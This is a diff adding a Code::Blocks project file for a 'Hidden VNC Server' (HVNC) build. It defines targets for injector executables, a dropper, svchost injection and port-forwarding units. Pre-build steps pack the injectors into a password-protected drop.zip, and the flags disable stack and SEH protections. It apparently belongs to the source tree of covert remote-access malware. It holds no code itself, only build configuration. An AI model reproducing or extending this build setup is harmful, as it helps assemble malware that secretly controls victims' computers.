@@ -1,0 +1,246 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="Hidden VNC Server" />
+		<Option pch_mode="2" />
+		<Option default_target="HVNC Release" />
+		<Option compiler="microsoft_visual_c_2008" />
+		<Build>
+			<Target title="InjExe Debug x64">
+				<Option output="..\bin\Debug\inj_x64" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Debug\inj x64\" />
+				<Option external_deps="..\bin\Debug\syslib x64.lib;..\bin\Debug\hvncinj x64.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008_x64" />
+				<Compiler>
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_INJEXE" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Debug\syslib x64.lib" />
+					<Add library="..\bin\Debug\hvncinj x64.lib" />
+				</Linker>
+			</Target>
+			<Target title="InjExe Release x64">
+				<Option output="..\bin\Release\inj_x64" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Release\inj x64\" />
+				<Option external_deps="..\bin\Release\syslib x64.lib;..\bin\Release\hvncinj x64.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008_x64" />
+				<Compiler>
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/favor:AMD64" />
+					<Add option="/Ob1" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_INJEXE" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Release\syslib x64.lib" />
+					<Add library="..\bin\Release\hvncinj x64.lib" />
+				</Linker>
+			</Target>
+			<Target title="HVNC Debug">
+				<Option output="..\bin\Debug\hvnc" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Debug\hvnc\" />
+				<Option external_deps="..\bin\Debug\libvncsrv.lib;..\bin\Debug\minizip.lib;..\bin\Debug\zlib.lib;..\bin\Debug\syslib x86.lib;..\bin\Debug\hvnc.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Debug\libvncsrv.lib" />
+					<Add library="..\bin\Debug\zlib x86.lib" />
+					<Add library="..\bin\Debug\syslib x86.lib" />
+					<Add library="..\bin\Debug\minizip x86.lib" />
+					<Add library="..\bin\Debug\hvnc.lib" />
+				</Linker>
+				<ExtraCommands>
+					<Add before="..\ext_tools\zip_store.exe ..\bin\debug\drop.zip password ..\bin\debug\inj_x64.exe ..\bin\debug\inj_x86.exe" />
+					<Add before="..\ext_tools\del ..\obj\Debug\hvnc\debug.res" />
+				</ExtraCommands>
+			</Target>
+			<Target title="HVNC Release">
+				<Option output="..\bin\Release\hvnc" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Release\hvnc\" />
+				<Option external_deps="..\bin\Release\libvncsrv.lib;..\bin\Release\minizip.lib;..\bin\Release\zlib.lib;..\bin\Release\syslib x86.lib;..\bin\Release\hvnc.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/Ob1" />
+					<Add option="/DNDEBUG" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Release\libvncsrv.lib" />
+					<Add library="..\bin\Release\zlib x86.lib" />
+					<Add library="..\bin\Release\syslib x86.lib" />
+					<Add library="..\bin\Release\minizip x86.lib" />
+					<Add library="..\bin\Release\hvnc.lib" />
+				</Linker>
+				<ExtraCommands>
+					<Add before="..\ext_tools\zip_store.exe ..\bin\release\drop.zip password ..\bin\release\inj_x64.exe ..\bin\release\inj_x86.exe" />
+					<Add before="..\ext_tools\del ..\obj\Release\hvnc\Release.res" />
+				</ExtraCommands>
+			</Target>
+			<Target title="InjExe Debug x86">
+				<Option output="..\bin\Debug\inj_x86" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Debug\inj x86\" />
+				<Option external_deps="..\bin\Debug\syslib x86.lib;..\bin\Debug\hvncinj x86.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_INJEXE" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Debug\syslib x86.lib" />
+					<Add library="..\bin\Debug\hvncinj x86.lib" />
+				</Linker>
+			</Target>
+			<Target title="InjExe Release x86">
+				<Option output="..\bin\Release\inj_x86" prefix_auto="1" extension_auto="1" />
+				<Option object_output="..\obj\Release\inj x86\" />
+				<Option external_deps="..\bin\Release\syslib x86.lib;..\bin\Release\hvncinj x86.lib;" />
+				<Option type="0" />
+				<Option compiler="microsoft_visual_c_2008" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/Ob1" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_INJEXE" />
+				</Compiler>
+				<Linker>
+					<Add library="..\bin\Release\syslib x86.lib" />
+					<Add library="..\bin\Release\hvncinj x86.lib" />
+				</Linker>
+			</Target>
+		</Build>
+		<VirtualTargets>
+			<Add alias="Debug" targets="InjExe Debug x64;InjExe Debug x86;HVNC Debug;" />
+			<Add alias="Debug x86" targets="InjExe Debug x86;HVNC Debug;" />
+			<Add alias="Release" targets="InjExe Release x64;InjExe Release x86;HVNC Release;" />
+			<Add alias="Release x86" targets="InjExe Release x86;HVNC Release;" />
+		</VirtualTargets>
+		<Compiler>
+			<Add option="/GA" />
+			<Add option="/Gy" />
+			<Add option="/W3" />
+			<Add option="/Zi" />
+			<Add option="/GS-" />
+			<Add option="/DUNICODE" />
+			<Add option="/D_UNICODE" />
+			<Add option="/D_HVNC" />
+			<Add directory="..\libs\system" />
+			<Add directory="..\libs\hvnc\hvnc" />
+			<Add directory="..\libs\minizip\minizip" />
+		</Compiler>
+		<Linker>
+			<Add option="/DEBUG" />
+			<Add option="/opt:ref" />
+			<Add option="/entry:main" />
+			<Add option="/filealign:512" />
+			<Add option="/ignore:4078" />
+			<Add option="/SAFESEH:NO" />
+			<Add option="/nodefaultlib" />
+			<Add option="/fixed:no" />
+			<Add library="ws2_32" />
+			<Add library="winmm" />
+			<Add library="psapi" />
+			<Add library="ntdll" />
+			<Add library="iphlpapi" />
+			<Add library="wininet" />
+			<Add library="dnsapi" />
+			<Add library="shlwapi" />
+			<Add library="cabinet" />
+			<Add library="dbghelp" />
+			<Add library="version" />
+			<Add library="crypt32" />
+			<Add library="oleacc" />
+			<Add library="vfw32" />
+			<Add library="UxTheme" />
+			<Add library="strmiids" />
+		</Linker>
+		<Unit filename="bot\system.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="crashrpt.cpp" />
+		<Unit filename="crashrpt.h" />
+		<Unit filename="debug.rc">
+			<Option compilerVar="WINDRES" />
+			<Option target="HVNC Debug" />
+		</Unit>
+		<Unit filename="defines.h" />
+		<Unit filename="dropper.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="dropper.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="func.cpp">
+			<Option compiler="microsoft_visual_c_2008" use="1" buildCommand="$compiler /nologo $options /GL- $includes /c $file /Fo$object" />
+		</Unit>
+		<Unit filename="func.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="includes.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="injexe\inj.h">
+			<Option target="InjExe Debug x64" />
+			<Option target="InjExe Release x64" />
+			<Option target="InjExe Debug x86" />
+			<Option target="InjExe Release x86" />
+		</Unit>
+		<Unit filename="injexe\main.cpp">
+			<Option target="InjExe Debug x64" />
+			<Option target="InjExe Release x64" />
+			<Option target="InjExe Debug x86" />
+			<Option target="InjExe Release x86" />
+		</Unit>
+		<Unit filename="main.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="portforw.cpp" />
+		<Unit filename="release.rc">
+			<Option compilerVar="WINDRES" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="svchost_inj.cpp" />
+		<Unit filename="svchost_inj.h" />
+		<Extensions>
+			<code_completion />
+			<envvars />
+			<debugger />
+			<DoxyBlocks>
+				<comment_style block="0" line="0" />
+				<doxyfile_project />
+				<doxyfile_build />
+				<doxyfile_warnings />
+				<doxyfile_output />
+				<doxyfile_dot />
+				<general />
+			</DoxyBlocks>
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
